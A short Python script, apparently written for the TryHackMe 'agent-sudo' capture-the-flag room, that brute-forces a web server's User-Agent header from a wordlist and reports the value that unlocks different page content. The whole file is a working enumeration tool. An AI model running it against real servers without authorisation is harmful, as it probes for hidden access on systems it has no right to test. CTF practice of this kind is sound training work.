#!/usr/bin/python

import requests
import argparse
from colorama import Fore, Style


parser = argparse.ArgumentParser(description = "User-Agent brute force script for agent-sudo challenge on TryHackMe.")
parser.add_argument("--wordlist", required = True, help = "Path to the wordlist to be used in place value of User-Agent Header")
parser.add_argument("--url", required = True, help = "Specify the target URL, Victim IP or URL (http://<IP>)")
arguments = parser.parse_args()

matcher = b'\n<!DocType html>\n<html>\n<head>\n\t<title>Annoucement</title>\n</head>\n\n<body>\n<p>\n\tDear agents,\n\t<br><br>\n\tUse your own <b>codename</b> as user-agent to access the site.\n\t<br><br>\n\tFrom,<br>\n\tAgent R\n</p>\n</body>\n</html>\n'

def bruteForce(wordlist, url, matcher):

	header = {
		'User-Agent' : ''
	}

	print(Fore.RED + f"[+] Starting User-Agent Brute Force on {url}")

	with open(wordlist, "r") as possibleUserAgents:
		agents = possibleUserAgents.readlines()
	
	for agent in agents:
		header['User-Agent'] = agent.strip("\n")
		response = requests.get(url, headers = header)
		if response.status_code == 200 and response.content == matcher:
			print(Fore.RED + f"[-] Incorrect User-Agent : {header['User-Agent']}")
		else:
			print(Fore.GREEN + f"[+] Success User-Agent : {header['User-Agent']}")
			print(Fore.GREEN + f"[*] Content \n{response.text}")
			break

	print(Style.RESET_ALL + "Credits @syncattacker (https://github.com/syncattacker)")


bruteForce(arguments.wordlist, arguments.url, matcher)



